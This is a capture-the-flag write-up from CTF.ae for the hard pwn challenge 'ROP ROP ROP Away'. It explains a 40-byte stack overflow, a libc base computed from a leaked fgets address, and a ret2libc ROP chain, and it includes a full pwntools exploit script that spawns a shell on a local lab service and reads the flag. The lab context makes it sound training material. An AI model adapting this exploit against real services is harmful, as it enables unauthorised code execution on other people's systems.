<img src="https://raw.githubusercontent.com/CTFae/media/main/brand/YT-banner.jpg" />

### Challenge: ROP ROP ROP Away
### Category: Pwn
### Difficulty: Hard
<hr>

#### Challenge Description
This challenge is intended to challenge users to use their knowledge of buffer overflow to bypass ASLR using a leaked function address. The binary and libc library are available to the players so they can craft payloads.

#### Challenge Screenshot
![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/rop_rop_rop_away-1.png)

#### Solution
Using standard techniques, the player will discover that the buffer size before hitting the instruction pointer is **40 bytes**.

The player should notice that ASLR is enabled using any available method, for example here is how to find out ASLR is enabled by running `checksec`.


![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/rop_rop_rop_away-2.png)

Since the address of `fgets()` is leaked and the libc file is provided, you can calculate the libc base address by subtracting the offset at which `fgets()` is located in the libc file. Here is an example of finding that offset by using `readelf`.

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/rop_rop_rop_away-3.png)

Since this is x64 binary, we need to find a ROP gadget that will allow us to `pop rdi`. This is how we can get our shellcode to execute. We can use the tool `ROPGadget` for this. 

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/rop_rop_rop_away-4.png)

We also need a `ret` instruction, let’s find one too.

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/rop_rop_rop_away-5.png)

Now that we have everything, we simply craft a payload that will consist of `40*A`, our `pop rdi`, the address of `/bin/sh` from inside the libc binary, a `ret` instruction and finally the address of `system()` from the libc. This is just standard x64 ROP buffer overflow.

#### Exploit Screenshot
![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/rop_rop_rop_away-6.png)


#### Exploit Script
```py
from pwn import *

HOST = '127.0.0.1'
PORT = 9999

# Splash screen for fun
splash()

# Connect to target
conn = remote(HOST, PORT)

# Read the address of gets
conn.recvuntil('is at ')
gets_address = int(conn.recvline().strip(), 16)
info('gets() is at ' + hex(gets_address))

# Read the libc
libc = ELF('./files/libc.so.6')
libc.address = gets_address - libc.symbols['fgets']
info('libc base is at ' + hex(libc.address))

# Build the exploit
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
ret = 0x0000000000400292
pop_rdi = 0x0000000000400693
rop_chain = [
    pop_rdi, bin_sh,
    ret,
    system
]

payload = b'A'*40 + b''.join([ p64(r) for r in rop_chain ])

# Recieve everything to prepare to send exploit
conn.recv()

# Send payload
info('ROP CHAIN: filler + pop_rdi + bin_sh + ret + system')
info(f'pop_rdi: {hex(pop_rdi)}')
info(f'bin_sh: {hex(bin_sh)}')
info(f'ret: {hex(ret)}')
info(f'system: {hex(system)}')
info('Sending exploit...')
conn.sendline(payload)
success('Target exploited! Getting flag...')

# Get flag
conn.recv()
conn.recv()
conn.sendline('/bin/cat /etc/flag.txt')
success(conn.recvline().decode('utf-8'))
conn.sendline('exit')
conn.close()
```

<hr>

&copy; <a href="https://ctf.ae" target=_blank>CTF.ae</a>
